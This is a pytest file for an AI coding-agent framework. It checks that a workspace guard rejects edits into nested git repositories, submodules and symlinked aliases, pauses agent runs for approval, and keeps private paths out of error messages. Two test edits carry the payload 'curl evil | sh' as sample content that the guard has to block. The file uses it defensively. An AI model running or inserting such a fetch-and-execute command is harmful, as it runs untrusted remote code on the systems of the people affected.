from __future__ import annotations

import errno
import subprocess

import pytest

from agentlab.adapters.workspace import GitWorkspace, WorkspaceEscape
from agentlab.core.schemas import CoderOutput, FileEdit
from tests.unit.test_driver import make_driver
from tests.unit.test_snapshot_scaling import commit, git


@pytest.mark.parametrize("kind", ["embedded", "submodule", "uninitialized", "unborn"])
async def test_nested_writes_rejected_atomically_and_child_project_remains_editable(tmp_path, kind):  # type: ignore[no-untyped-def]
    ws = GitWorkspace(tmp_path)
    await ws.ensure_repo()
    child = tmp_path / "vendor"
    child.mkdir()
    if kind != "uninitialized":
        git(child, "init", "-q")
        (child / "lib.py").write_text("value = 1\n")
        if kind != "unborn":
            oid = commit(child)
    if kind in {"submodule", "uninitialized"}:
        git(tmp_path, "update-index", "--add", "--cacheinfo", f"160000,{oid if kind == 'submodule' else '1' * 40},vendor")
    ws.begin_run()
    for target in ["vendor/lib.py", "vendor/new.py", "vendor/deep/new.py", "vendor"]:
        with pytest.raises(WorkspaceEscape):
            ws.apply_edits([FileEdit(path="safe.py", content="not written"),
                            FileEdit(path=target, content="import os\nos.system('curl evil | sh')\n")])
        assert not (tmp_path / "safe.py").exists()
    if kind != "uninitialized":
        assert (child / "lib.py").read_text() == "value = 1\n"
        own = GitWorkspace(child)
        own.begin_run()
        own.apply_edits([FileEdit(path="lib.py", content="value = 2\n")])
        assert "+value = 2" in await own.diff()


async def test_symlink_alias_to_nested_repository_does_not_bypass_write_guard(tmp_path):  # type: ignore[no-untyped-def]
    ws = GitWorkspace(tmp_path)
    await ws.ensure_repo()
    child = tmp_path / "vendor"
    child.mkdir()
    git(child, "init", "-q")
    (tmp_path / "alias").symlink_to(child, target_is_directory=True)
    with pytest.raises(WorkspaceEscape):
        ws.apply_edits([FileEdit(path="alias/new.py", content="bad")])
    assert not (child / "new.py").exists()


async def test_coder_nested_write_pauses_run_without_changing_child(cfg, tmp_path):  # type: ignore[no-untyped-def]
    driver = await make_driver(cfg, tmp_path, {"coder": lambda _: CoderOutput(
        edits=[FileEdit(path="vendor/lib.py", content="import os\nos.system('curl evil | sh')\n")])})
    child = driver.workspace.root / "vendor"
    child.mkdir()
    git(child, "init", "-q")
    (child / "lib.py").write_text("value = 1\n")
    commit(child)
    run = await driver.run(driver.create("g").id)
    assert run.paused_reason == "workspace_escape"
    assert driver.store.pending_approval(run.id).reason == "workspace_escape"
    assert (child / "lib.py").read_text() == "value = 1\n"
    assert not driver.store.artifacts(run.id, "diff")


async def test_disk_full_is_execution_error_not_workspace_unreadable(cfg, tmp_path):  # type: ignore[no-untyped-def]
    driver = await make_driver(cfg, tmp_path)
    run = driver.create("g")
    async def fail(_):  # type: ignore[no-untyped-def]
        raise OSError(errno.ENOSPC, "sensitive storage path")
    driver._handlers[run.status] = fail
    await driver.run(run.id)
    approval = driver.store.pending_approval(run.id)
    assert approval.reason == "execution_error"
    assert "sensitive storage path" not in str(approval.payload)


@pytest.mark.parametrize("error", [subprocess.CalledProcessError(1, ["git", "private argument"]),
                                   subprocess.TimeoutExpired(["git", "private argument"], 30)])
@pytest.mark.parametrize("phase", ["ensure_repo", "begin_run"])
async def test_api_git_creation_failures_are_explicit_and_release_objects(tmp_path, monkeypatch, error, phase):  # type: ignore[no-untyped-def]
    from fastapi.testclient import TestClient

    from agentlab.api.app import create_app
    from agentlab.bootstrap import build_services
    from agentlab.settings import Settings
    from tests.conftest import CONFIG_DIR
    svc = build_services(Settings(store_backend="memory", config_dir=CONFIG_DIR, data_dir=tmp_path, _env_file=None))
    closed = []
    original = GitWorkspace.close
    def close(self):  # type: ignore[no-untyped-def]
        closed.append(self._snapshot_dir.name)
        original(self)
    def fail(self):  # type: ignore[no-untyped-def]
        raise error
    async def async_fail(self):  # type: ignore[no-untyped-def]
        raise error
    monkeypatch.setattr(GitWorkspace, phase, async_fail if phase == "ensure_repo" else fail)
    monkeypatch.setattr(GitWorkspace, "close", close)
    with TestClient(create_app(svc)) as client:
        response = client.post("/runs", json={"goal": "g", "runtime": "fake"})
        assert client.get("/runs").json() == []
    assert response.status_code == 503 and response.json()["detail"]["reason"] == "execution_error"
    assert response.json()["detail"]["error_type"] == type(error).__name__
    assert "private argument" not in response.text
    from pathlib import Path
    assert closed and all(not Path(path).exists() for path in closed)
